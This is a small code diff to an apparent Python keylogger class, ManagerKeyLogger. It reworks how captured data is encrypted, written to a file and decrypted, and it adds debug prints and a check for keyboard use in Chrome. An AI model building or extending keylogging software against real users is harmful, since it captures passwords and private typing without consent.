@@ -40,15 +40,17 @@ class ManagerKeyLogger:
             data = self.service.get_data()
             if data:
               # data_str = json.dumps(data)
-              self.encryptor.encrypt(data)
-              text_encrypt=self.encryptor.text_encrypto
+
+              text_encrypt=self.encryptor.encrypt(data)
+              # text_encrypt=self.encryptor.text_encrypto
               self.writeFile.write(text_encrypt)
-              data_json=self.writeFile.load_data()
-              # decrypt=self.encryptor.decrypt(data_json)
-              print(data)
-              print(data_json)
-              # print(decrypt)
-              print( text_encrypt)
+              data_json = self.writeFile.load_data()
+              decrypt = self.encryptor.decrypt(data_json)
+
+              print("Original Data:", data)
+              print("Encrypted Data:", text_encrypt)
+              print("Data from File:", data_json)
+              print("Decrypted Data:", decrypt)
               # print(decrypt)
 
     def is_keyboard_in_chrome(self):
